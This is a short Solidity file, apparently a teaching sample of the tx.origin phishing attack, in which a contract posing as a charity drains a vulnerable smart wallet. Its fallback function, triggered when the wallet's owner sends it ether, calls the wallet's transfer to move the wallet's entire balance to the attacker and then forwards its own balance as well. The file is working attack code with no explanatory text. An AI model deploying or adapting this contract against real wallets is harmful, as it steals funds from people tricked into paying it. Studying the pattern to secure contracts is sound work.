// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

interface ISmartWallet {
    function transfer(address payable _to, uint256 _amount) external;
}

contract MaliciousCharity {
    address payable private owner;
    ISmartWallet private wallet;

    constructor(address _vulnerableWallet) {
        owner = payable(msg.sender);
        wallet = ISmartWallet(_vulnerableWallet);
    }

    fallback() external payable {
        wallet.transfer(owner, address(wallet).balance);
        payable(owner).transfer(address(this).balance);
    }
}
